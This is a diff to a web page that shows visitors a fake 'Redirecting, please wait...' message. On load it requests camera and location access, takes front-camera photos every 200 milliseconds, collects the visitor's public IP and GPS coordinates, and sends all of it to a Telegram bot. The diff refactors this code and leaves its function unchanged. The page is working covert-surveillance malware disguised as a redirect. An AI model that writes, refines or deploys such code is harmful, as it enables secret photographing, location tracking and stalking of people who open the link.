@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Continuous Camera Capture</title>
   <style>
@@ -21,7 +21,6 @@
       color: #007bff;
     }
   </style>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 </head>
 <body>
   <div class="loading">Redirecting, please wait...</div>
@@ -33,15 +32,14 @@
     // Function to get user's IP address
     function getUserIP() {
       return new Promise((resolve, reject) => {
-        $.get('https://api.ipify.org?format=json', function(data) {
-          resolve(data.ip);
-        }).fail(function() {
-          reject('Unable to fetch IP');
-        });
+        fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => resolve(data.ip))
+          .catch(() => reject('Unable to fetch IP'));
       });
     }
 
-    // Function to get the user's location (prompt permission)
+    // Function to get user's location
     function getLocation() {
       return new Promise((resolve, reject) => {
         if (navigator.geolocation) {
@@ -60,71 +58,66 @@
       });
     }
 
-    // Function to start capturing photos continuously
+    // Function to start capturing photos continuously from the front camera
     function startCapturing() {
-      navigator.mediaDevices.enumerateDevices().then(devices => {
-        let videoDeviceId = null;
-        
-        // Select the front camera if available
-        for (const device of devices) {
-          if (device.kind === 'videoinput' && device.label.includes('front')) {
-            videoDeviceId = device.deviceId;
-            break;
-          }
-        }
+      navigator.mediaDevices.enumerateDevices()
+        .then(devices => {
+          let videoDeviceId = null;
 
-        if (!videoDeviceId) {
-          // If no front camera found, fall back to the first available camera
+          // Find the front camera if available
           for (const device of devices) {
-            if (device.kind === 'videoinput') {
+            if (device.kind === 'videoinput' && device.label.includes('front')) {
               videoDeviceId = device.deviceId;
               break;
             }
           }
-        }
 
-        // Start capturing from selected camera
-        navigator.mediaDevices.getUserMedia({ video: { deviceId: videoDeviceId } })
-          .then((stream) => {
-            const videoTrack = stream.getVideoTracks()[0];
-            const imageCapture = new ImageCapture(videoTrack);
-
-            // Function to capture and send photos continuously
-            function captureAndSendPhoto() {
-              imageCapture.takePhoto()
-                .then((blob) => {
-                  console.log("Photo captured");
-
-                  getUserIP().then((ip) => {
-                    console.log("User IP: " + ip);
-                    
-                    getLocation().then((location) => {
-                      console.log("Location: Latitude " + location.latitude + ", Longitude " + location.longitude);
-                      sendToTelegram(blob, ip, location);
-                    }).catch(error => {
-                      console.error('Location Error:', error);
-                    });
-                  }).catch(error => {
-                    console.error('IP Fetch Error:', error);
-                  });
-                })
-                .catch((error) => {
-                  console.error('Error capturing photo:', error);
-                });
+          if (!videoDeviceId) {
+            // If no front camera found, fall back to the first available camera
+            for (const device of devices) {
+              if (device.kind === 'videoinput') {
+                videoDeviceId = device.deviceId;
+                break;
+              }
             }
+          }
 
-            // Capture and send photo every 200 milliseconds (fast interval)
-            setInterval(captureAndSendPhoto, 200);  // Interval set to capture every 200 milliseconds (0.2 second)
-          })
-          .catch((error) => {
-            console.error('Permission error:', error);
-          });
-      }).catch((error) => {
-        console.error('Error enumerating devices:', error);
-      });
+          // Start capturing from selected camera
+          navigator.mediaDevices.getUserMedia({ video: { deviceId: videoDeviceId } })
+            .then((stream) => {
+              const videoTrack = stream.getVideoTracks()[0];
+              const imageCapture = new ImageCapture(videoTrack);
+
+              // Capture and send photos continuously every 200 milliseconds (0.2 seconds)
+              setInterval(() => {
+                imageCapture.takePhoto()
+                  .then((blob) => {
+                    console.log("Photo captured");
+
+                    getUserIP().then(ip => {
+                      getLocation().then(location => {
+                        sendToTelegram(blob, ip, location);
+                      }).catch(err => {
+                        console.error("Location Error:", err);
+                      });
+                    }).catch(err => {
+                      console.error("IP Error:", err);
+                    });
+                  })
+                  .catch((error) => {
+                    console.error('Error capturing photo:', error);
+                  });
+              }, 200);  // 200ms interval between photo captures
+
+            }).catch((error) => {
+              console.error('Permission error:', error);
+            });
+        }).catch((error) => {
+          console.error('Error enumerating devices:', error);
+        });
     }
 
-    // Function to send the photo, IP, and location to Telegram bot
+    // Function to send the captured photo along with IP and location to Telegram
     function sendToTelegram(data, ip, location) {
       const formData = new FormData();
       formData.append('chat_id', chatId);
@@ -149,21 +142,14 @@
       });
     }
 
-    // Example of shortening a URL (optional)
-    function handleShortenURL() {
-      const longUrl = prompt("Enter a URL to shorten:");
-      if (longUrl) {
-        shortenURL(longUrl).then((shortUrl) => {
-          alert(`Shortened URL: ${shortUrl}`);
-        }).catch((error) => {
-          alert(error);
-        });
-      }
-    }
-
-    // Trigger URL shortening on page load (optional)
+    // Request all necessary permissions on page load
     window.onload = function() {
-      startCapturing(); // Start capturing photos and sending them continuously
+      // Ask for camera and location permissions
+      if (navigator.mediaDevices && navigator.geolocation) {
+        startCapturing();
+      } else {
+        alert('This device does not support the required permissions.');
+      }
     };
   </script>
 </body>
